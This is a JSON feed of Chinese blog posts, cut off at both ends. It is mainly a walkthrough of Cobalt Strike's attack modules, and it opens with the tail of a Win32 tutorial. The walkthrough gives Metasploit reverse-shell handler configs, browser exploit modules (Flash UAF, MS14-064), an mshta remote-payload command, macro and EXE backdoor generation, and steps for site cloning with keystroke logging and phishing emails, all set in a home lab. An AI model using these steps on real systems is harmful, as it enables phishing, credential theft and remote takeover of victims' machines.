function\">PostQuitMessage</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre></pre></td></tr><tr><td data-num=\"108\"></td><td><pre>\t<span class=\"token keyword\">case</span> WM_CREATE<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"109\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"110\"></td><td><pre>\t\t<span class=\"token function\">CreateWindow</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"111\"></td><td><pre>\t\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"EDIT\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"112\"></td><td><pre>\t\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"113\"></td><td><pre>\t\t\tWS_CHILD <span class=\"token operator\">|</span> WS_VISIBLE <span class=\"token operator\">|</span> WS_VSCROLL <span class=\"token operator\">|</span> ES_MULTILINE<span class=\"token punctuation\">,</span>    <span class=\"token comment\">// 子窗口通用 style 和特殊 style</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>\t\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>\t\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>\t\t\t<span class=\"token number\">500</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>\t\t\t<span class=\"token number\">300</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>\t\t\thwnd<span class=\"token punctuation\">,</span>                    <span class=\"token comment\">// 父窗口</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span>HMENU<span class=\"token punctuation\">)</span>IDC_EDIT_1<span class=\"token punctuation\">,</span>       <span class=\"token comment\">// 子窗口身份标识</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>\t\t\tg_hInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre>\t\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre>\t\t<span class=\"token function\">CreateWindow</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre>\t\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"BUTTON\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>\t\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"设置\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>\t\t\tWS_CHILD <span class=\"token operator\">|</span> WS_VISIBLE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>\t\t\t<span class=\"token number\">520</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>\t\t\t<span class=\"token number\">180</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>\t\t\t<span class=\"token number\">60</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>\t\t\t<span class=\"token number\">30</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>\t\t\thwnd<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span>HMENU<span class=\"token punctuation\">)</span>IDC_BUTTON_1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>\t\t\tg_hInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>\t\t\t<span class=\"token constant\">NULL</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>\t\t<span class=\"token function\">CreateWindow</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>\t\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"BUTTON\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>\t\t\t<span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"获取\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>\t\t\tWS_CHILD <span class=\"token operator\">|</span> WS_VISIBLE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>\t\t\t<span class=\"token number\">520</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>\t\t\t<span class=\"token number\">220</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>\t\t\t<span class=\"token number\">60</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>\t\t\t<span class=\"token number\">30</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>\t\t\thwnd<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>\t\t\t<span class=\"token punctuation\">(</span>HMENU<span class=\"token punctuation\">)</span>IDC_BUTTON_2<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>\t\t\tg_hInstance<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>\t\t\t<span class=\"token constant\">NULL</span>\t</pre></td></tr><tr><td data-num=\"148\"></td><td><pre>\t\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>\t<span class=\"token keyword\">case</span> WM_COMMAND<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>\t\t<span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token function\">LOWORD</span><span class=\"token punctuation\">(</span>wParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> IDC_BUTTON_1<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>\t\t\t<span class=\"token function\">SetDlgItemText</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> IDC_EDIT_1<span class=\"token punctuation\">,</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Hello world !\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>\t\t<span class=\"token keyword\">case</span> IDC_BUTTON_2<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>\t\t<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre>\t\t\t<span class=\"token function\">GetDlgItemText</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> IDC_EDIT_1<span class=\"token punctuation\">,</span> szOutBuff<span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>\t\t\t<span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> szOutBuff<span class=\"token punctuation\">,</span> szOutBuff<span class=\"token punctuation\">,</span> MB_OK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>\t\t<span class=\"token keyword\">default</span><span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>\t\t\t<span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>\t\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token function\">DefWindowProc</span><span class=\"token punctuation\">(</span>hwnd<span class=\"token punctuation\">,</span> uMsg<span class=\"token punctuation\">,</span> wParam<span class=\"token punctuation\">,</span> lParam<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>点击设置后，编辑框会出现 test。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>点击获取，会弹出编辑框内的内容。</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n",
            "tags": [
                "Win32",
                "Win子窗口控件"
            ]
        },
        {
            "id": "https://self-ferry.github.io/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "url": "https://self-ferry.github.io/CobaltStrike%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/",
            "title": "CobaltStrike攻击模块的使用",
            "date_published": "2021-07-07T06:27:57.000Z",
            "content_html": "<h1 id=\"attacks模块简介\"><a class=\"anchor\" href=\"#attacks模块简介\">#</a> Attacks 模块简介</h1>\n<h2 id=\"packages模块\"><a class=\"anchor\" href=\"#packages模块\">#</a> packages 模块</h2>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>HTML Application 　　　　　　 生成一个恶意 HTML Application 木马，后缀格式为 .hta。通过 HTML 调用其他语言的应用组件进行攻击，提供了可执行文件、PowerShell、VBA 三种方法<br />\n MS Office Macro 　　　　　　   生成 office 宏病毒文件；<br />\nPayload Generator 　　　　　   生成各种语言版本的 payload，可以生成基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等的 payload<br />\nWindows Executable 　　　　　生成 32 位或 64 位的 exe 和基于服务的 exe、DLL 等后门程序<br />\n Windows Executable (S)　　　　用于生成一个 exe 可执行文件，其中包含 Beacon 的完整 payload，不需要阶段性的请求。与 Windows Executable 模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持 powershell 脚本，可用于将 Stageless Payload 注入内存</p>\n<blockquote>\n<p>HTML Application:<br />\n 生成一个恶意 HTML Application 木马，后缀格式为 .hta。通过 HTML 调用其他语言的应用组件进行攻击，提供了可执行文件、PowerShell、VBA 三种方法</p>\n</blockquote>\n<blockquote>\n<p>MS Office Macro:<br />\n 生成 office 宏病毒文件；</p>\n</blockquote>\n<blockquote>\n<p>Payload Generator:<br />\n 生成各种语言版本的 payload，可以生成基于 C、C#、COM Scriptlet、Java、Perl、PowerShell、Python、Ruby、VBA 等的 payload</p>\n</blockquote>\n<blockquote>\n<p>Windows Executable:<br />\n 生成 32 位或 64 位的 exe 和基于服务的 exe、DLL 等后门程序</p>\n</blockquote>\n<blockquote>\n<p>Windows Executable(S)<br />\n 用于生成一个 exe 可执行文件，其中包含 Beacon 的完整 payload，不需要阶段性的请求。<br />\n与 Windows Executable 模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持 powershell 脚本，可用于将 Stageless Payload 注入内存。</p>\n</blockquote>\n<h2 id=\"web-drive-by-网站钓鱼攻击\"><a class=\"anchor\" href=\"#web-drive-by-网站钓鱼攻击\">#</a> Web Drive-by 网站钓鱼攻击</h2>\n<p>点击中间的 Attacks——&gt; Web Drive-by（网站钓鱼攻击）</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>Manage　　　　　　　　　　 对开启的 web 服务进行管理；<br />\nClone Site 　　 　　　　　克隆网站，可以记录受害者提交的数据；<br />\nHost File 　　　　　　　　提供一个文件下载，可以修改 Mime 信息；Host File 可以配合 DNS 欺骗实现挂马效果使用<br />\n Scripted Web Delivery    基于 Web 的攻击测试脚本，自动生成可执行的 payload ;<br />\nSigned Applet Attack 　　启动一个 Web 服务以提供自签名 Java Applet 的运行环境；<br />\nSmart Applet Attack 　　自动检测 Java 版本并 l 利用已知的 exploits 绕过 security；<br />\nSystem Profiler　　　　　用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等。<br />\nSpear Phish 　　　　　　　用来邮件钓鱼的模块</p>\n<blockquote>\n<p>Manage:<br />\n 对开启的 web 服务进行管理；</p>\n</blockquote>\n<blockquote>\n<p>Clone Site:<br />\n 克隆网站，可以记录受害者提交的数据；</p>\n</blockquote>\n<blockquote>\n<p>Host File:<br />\n 提供一个文件下载，可以修改 Mime 信息；Host File 可以配合 DNS 欺骗实现挂马效果使用</p>\n</blockquote>\n<blockquote>\n<p>Scripted Web Delivery:<br />\n 基于 Web 的攻击测试脚本，自动生成可执行的 payload;</p>\n</blockquote>\n<blockquote>\n<p>Signed Applet Attack:<br />\n 启动一个 Web 服务以提供自签名 Java Applet 的运行环境；</p>\n</blockquote>\n<blockquote>\n<p>Smart Applet Attack:<br />\n 自动检测 Java 版本并 l 利用已知的 exploits 绕过 security；</p>\n</blockquote>\n<blockquote>\n<p>System Profiler:<br />\n 用来获取一些系统信息，比如系统版本，Flash 版本，浏览器版本等。</p>\n</blockquote>\n<blockquote>\n<p>Spear Phish:<br />\n 用来邮件钓鱼的模块</p>\n</blockquote>\n<h1 id=\"cobaltstrike-attacks模块的利用方法\"><a class=\"anchor\" href=\"#cobaltstrike-attacks模块的利用方法\">#</a> CobaltStrike Attacks 模块的利用方法</h1>\n<h2 id=\"msf与cobaltstrike结合获取meterpreter\"><a class=\"anchor\" href=\"#msf与cobaltstrike结合获取meterpreter\">#</a> MSF 与 CobaltStrike 结合获取 meterpreter</h2>\n<p>在 CobaltStrike 中的 Listenter 中有一些 Foreign 的载荷（payload），常用于于 MSF 结合</p>\n<p>创建 Beacon Listener</p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 Foregin (windows/foregin/reverse_http) -&gt;  msf 攻击机 ip/msf 监听端口 (192.168.199.145:4444)</p>\n</blockquote>\n<p>在攻击机上进行 msf 监听</p>\n<blockquote>\n<p>use exploit/multi/handler<br />\nset payload windows/meterpreter/reverse_http<br />\nset lhost 192.168.199.145<br />\nset lport 4444<br />\nrun/exploit</p>\n</blockquote>\n<p>生成攻击文件在目标机器运行既可</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<h2 id=\"利用web服务远程加载文件获取beacon\"><a class=\"anchor\" href=\"#利用web服务远程加载文件获取beacon\">#</a> 利用 web 服务，远程加载文件，获取 beacon</h2>\n<p>利用 <code>Attack -&gt;  packeg</code>  中的 <code>HTML Application</code></p>\n<p>一个 <code>HTML Application</code> （HTML 应用）是一个使用 HTML 和一个 Internet 浏览器支持的脚本语言编写的 Windows 程序。该程序包生成一个 HTML 应用，该应用运行一个 <code>Cobalt Strike payload</code> 。你可以选择一个 HTML 应用，此 HTML 应用使得一个可执行文件落地在磁盘上并运行它。选择 <code>powershell</code>  选项来得到一个 HTML 应用，该应用应该使用 <code>Powershell</code>  来运行一个 <code>payload</code></p>\n<p>新建一个 <code>Linsenter</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>创建一个.hta 的恶意文件</p>\n<blockquote>\n<p>Attacks -&gt;  Package -&gt;  HTML Application -&gt;  选择 Listener -&gt;  method 选择 powershell -&gt;  Generate</p>\n</blockquote>\n<p>加载本地文件到服务端，进行 web 服务</p>\n<blockquote>\n<p>Attacks -&gt;  Web Drive-by -&gt;  Host File -&gt;  File 选择本地生成的.hta 文件</p>\n</blockquote>\n<p>目标机 cmd.exe 中运行以下命令（白名单文件 mshta.exe 无免杀，在加载.hta 文件时可被多种杀软查杀)(mshta.exe 是微软 Windows 操作系统相关程序，用于执行.HTA 文件，或在批处理中结合其他语言的代码；如：mshta javascript，可用于运行一个 HTML 网页而不会出现安全警告。)</p>\n<blockquote>\n<p>mshta <span class=\"exturl\" data-url=\"aHR0cDovL3huLS1pcCstMHkzZTE4OW8vZG93bmxvYWQvZmlsZS5leHQ=\">http://ip + 端口 /download/file.ext</span></p>\n</blockquote>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>靶机上线。</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<h2 id=\"ms-office-macro-宏获取beacon\"><a class=\"anchor\" href=\"#ms-office-macro-宏获取beacon\">#</a> MS Office Macro 宏获取 beacon</h2>\n<p>利用 Attack -&gt;  Package -&gt;  MS office Macro</p>\n<p><code>MS office Macro</code>  模块提供一个 <code>Microsoft Office</code>  的宏文件，并提供嵌入 <code>Microsoft World</code>  或 <code>Microsoft Excel</code>  的说明</p>\n<p>新建一个 <code>Linsenter</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>利用 <code>MS Office Macro</code>  模块获取宏</p>\n<blockquote>\n<p>Attack -&gt;  Package -&gt;  MS office Macr</p>\n</blockquote>\n<p>将获取的宏嵌入到文档当中</p>\n<blockquote>\n<p>Microsoft World 文档 -&gt;  视图 -&gt;  宏 -&gt;  宏名任意 -&gt;  创建 -&gt;  Microsoft Visual Basic for Application 控制台 -&gt;  将生成的宏复制到代码区 -&gt; 保存</p>\n</blockquote>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p>靶机上线。</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"制作钓鱼网址盗取用户输入信息\"><a class=\"anchor\" href=\"#制作钓鱼网址盗取用户输入信息\">#</a> 制作钓鱼网址盗取用户输入信息</h2>\n<p>利用 Attack -&gt;  Web Drive-by -&gt; Clone Site 制作钓鱼网址</p>\n<p>在向目标发送漏洞利用程序之前，进行伪装会有所帮助。 <code>Cobalt Strike</code>  的网站克隆工具可以帮助此目标。网站克隆工具制作一个网站的本地的复制，使用一些增加的代码来修复连接和图像这样它们可以如预期一样工作。</p>\n<p>建立 <code>Linstener</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>利用 <code>Clone Site</code>  获取钓鱼网址</p>\n<blockquote>\n<p>Attack -&gt;  Web Drive-by -&gt; Clone Site -&gt;  Clone Url (被克隆网址) -&gt;  勾选 Log Keystroken on Cloned site</p>\n</blockquote>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<p>利用网站日志（web Log）查看被钓鱼方输入的信息</p>\n<blockquote>\n<p>View -&gt;  Web Log</p>\n</blockquote>\n<p>如下为被克隆网站</p>\n<p><img data-src=\"image009.png\" alt=\"\" /></p>\n<h2 id=\"简单exe等可执行文件上线目标主机\"><a class=\"anchor\" href=\"#简单exe等可执行文件上线目标主机\">#</a> 简单 EXE 等可执行文件上线目标主机</h2>\n<p>利用 Attack -&gt;  Packages -&gt;  Windows Executable/(s)</p>\n<p>该程序包含一个 Windows 可执行 <code>Artifact</code> ，用于传送一个 <code>Payload Stager</code> 。这个程序包为使用者提供了多种输出选项。 <code>Windows Service EXE</code>  是一个 Windows 可执行文件，可响应 <code>Service Control Manager</code>  命令。使用者可以使用这个可执行文件来作为使用 <code>SC</code>  命令行的 Windows 服务的调用程序，或使用 <code>Metasploit</code>  框架的 <code>PsExec</code>  模块生成一个自定义的可执行文件。<br />\n普通的 EXE 和服务器启动调用的 EXE 是由区别的，利用 <code>Windows Service EXE</code>  生成的 EXE 才能用来作为服务自启动的 EXE，利用 <code>Cobalt Strike</code>  中 Windows EXE 生成的 EXE 不能作为服务自启动的 EXE 程序。</p>\n<p>创建一个监听</p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>生成可执行程序</p>\n<blockquote>\n<p>Attack -&gt;  Packages -&gt; windows Executable/(s)</p>\n</blockquote>\n<p>目标机器运行可执行文件，上线目标主机</p>\n<p><img data-src=\"image010.png\" alt=\"\" /></p>\n<p>生成 Powershell 版的需要在目标主机的 Powershell 控制台运行该 ps1 脚本<br />\n生成 dll 文件，需要在目标主机加载</p>\n<h2 id=\"利用msf结合cobalt-strike获取cs-beacon\"><a class=\"anchor\" href=\"#利用msf结合cobalt-strike获取cs-beacon\">#</a> 利用 MSF 结合 Cobalt Strike 获取 CS beacon</h2>\n<p>在 0x01 部分，我们知道 Cobalt Strike 可以与 MSF 配合获取 meterpreter，当然，二者也可以相互配合获取 Beacon。</p>\n<p>你可以使用 MSF 中的 <code>exploit/windows/local/payload_inject</code>  模块将 MSF 获取的 <code>meterpreter</code>  传送给 <code>Cobalt Strike</code></p>\n<p>Cobalt Strike 新建一个 <code>Listener</code></p>\n<blockquote>\n<p>CobaltStrike -&gt;  Listener -&gt;  add -&gt;  payload 选择 (windows/beacon_http/reverse_http)</p>\n</blockquote>\n<p>MSF 获取目标 <code>meterpreter</code> <br />\n 将 <code>meterpreter</code>  利用 <code>exploit/windows/local/payload_inject</code>  模块传送给 CS</p>\n<blockquote>\n<p>background<br />\nuse exploit/windows/local/payload_inject</p>\n</blockquote>\n<p>设定 CS 的 ip 和监听端口</p>\n<blockquote>\n<p>set LHOST CSip<br />\nset LPORT CS Listener 监听端口<br />\n set disablepayloadhandler true</p>\n</blockquote>\n<p><img data-src=\"image011.png\" alt=\"\" /></p>\n<p>设定传送的 <code>session</code></p>\n<blockquote>\n<p>set session id</p>\n</blockquote>\n<p>session id 可输入 <code>sessions</code>  查看</p>\n<p><img data-src=\"image012.png\" alt=\"\" /></p>\n<p>运行即可</p>\n<p><img data-src=\"image013.png\" alt=\"\" /></p>\n<h2 id=\"payload-generatorpayload-生成器\"><a class=\"anchor\" href=\"#payload-generatorpayload-生成器\">#</a> Payload Generator (Payload 生成器)</h2>\n<p>该模块可以生成 n 中语言的后门 Payload，包括 C,C#,Python,Java,Perl,Powershell 脚本，Powershell 命令，Ruby,Raw，免杀框架 Veli 中的 shellcode 等等... 这是 CS 的一个很大的迷人之处。</p>\n<blockquote>\n<p>attack -&gt;  Packages -&gt;  payload Generator</p>\n</blockquote>\n<p><img data-src=\"image014.png\" alt=\"\" /></p>\n<h2 id=\"cs发送钓鱼邮件\"><a class=\"anchor\" href=\"#cs发送钓鱼邮件\">#</a> CS 发送钓鱼邮件</h2>\n<p>CS 能生成 Office 宏，发现生成的该文件很容易被杀软监测出来，并处理掉，加上它的局限性，在外网实际中意义不大，在内网用效果可能还好。主要是思路。</p>\n<p>实验环境</p>\n<p>虚拟机搭建的邮件服务器地址：192.168.199.133</p>\n<p>Cobalt strike 服务器地址：192.168.199.145</p>\n<p>Kali 虚拟机地址：192.168.199.145</p>\n<p>这里我们应用到一个 flash 插件漏洞的 payloads： <code>adobe_flash_hacking_team_uaf</code></p>\n<p>通过 Cobalt Strike 结合 metasploit 进行实验，如下：</p>\n<p>通过 kali 启用 metasploit。</p>\n<p>配置：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/multi/browser/adobe_flash_hacking_team_uaf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_http</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.199.145</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> lport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> disablepayloadhandler <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> prependmigrate <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>exploit</pre></td></tr></table></figure><p><img data-src=\"image021.png\" alt=\"\" /></p>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<p>执行后如图所示，会得到一个利用地址，记录该地址：</p>\n<p>这里使用</p>\n<p><code>Local IP: http://192.168.199.145:8080/I2bDeFpXx21H</code></p>\n<p>接下来为了方便钓鱼邮件的内容伪造的真实，我们通过 cobalt strike 克隆一个网站。</p>\n<p>进入 Web-Drive-by 选项选择 Clone Site。</p>\n<p>这里提醒下，如果在克隆模块克隆的是 HTTPS 的页面，需要在攻击方加载 SSL 哦，不然没法记录或者执行！(踩坑)</p>\n<p>其中 attack 就是我们 metasploit 中生成的地址链接</p>\n<p><img data-src=\"image023.png\" alt=\"\" /></p>\n<p>克隆成功</p>\n<p><img data-src=\"image024.png\" alt=\"\" /></p>\n<p>克隆出来的百度</p>\n<p><img data-src=\"image025.png\" alt=\"\" /></p>\n<p>记录的键盘操作</p>\n<p><img data-src=\"image026.png\" alt=\"\" /></p>\n<p>克隆出来的百度网页源代码</p>\n<p><img data-src=\"image027.png\" alt=\"\" /></p>\n<p>利用 flash 插件漏洞生成的一个克隆链接成功。</p>\n<p>现在我们进行邮件伪造。</p>\n<p>kali 下创建目标清单 targets.txt<br />\n 注意邮箱和姓名要用 TAB 键隔开，可以是多个邮件地址，每一行一个邮件地址。</p>\n<p><img data-src=\"image028.png\" alt=\"\" /></p>\n<p>创建一个钓鱼模板，可以直接下载一个 eml 文件来使用，这个最好还是逼真一点好。</p>\n<p>配置完毕</p>\n<p><img data-src=\"image029.png\" alt=\"\" /></p>\n<p>发送邮件</p>\n<p><img data-src=\"image030.png\" alt=\"\" /></p>\n<p>邮件发送成功，如果客户端存在 flash 漏洞，等待点击邮件模板里的链接即可跳转到我们的 http://192.168.199.145/search 地址，并通过 flash 漏洞，获取到该终端的权限，该终端会成功上线。</p>\n<p>注意：因为邮件服务器和 CS 服务器都是我在本地虚拟机搭建的，不在公网上的。所以暂时未模拟到真实邮件。</p>\n<h2 id=\"metasploit溢出代码与cobalt-strik配合钓鱼\"><a class=\"anchor\" href=\"#metasploit溢出代码与cobalt-strik配合钓鱼\">#</a> Metasploit 溢出代码与 Cobalt Strik 配合钓鱼</h2>\n<p>拿的是一个针对 XP 或者以下系统，利用 MS14_064 利用 IE 执行远控木马。 主要还是思路。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/windows/browser/ms14_064_ole_code_execution</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvhost <span class=\"token number\">192.168</span>.199.145</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> SRVPORT <span class=\"token number\">6666</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/meterpreter/reverse_tcp</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.199.139</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>exploit</pre></td></tr></table></figure><p>生成神秘代码！！</p>\n<p><img 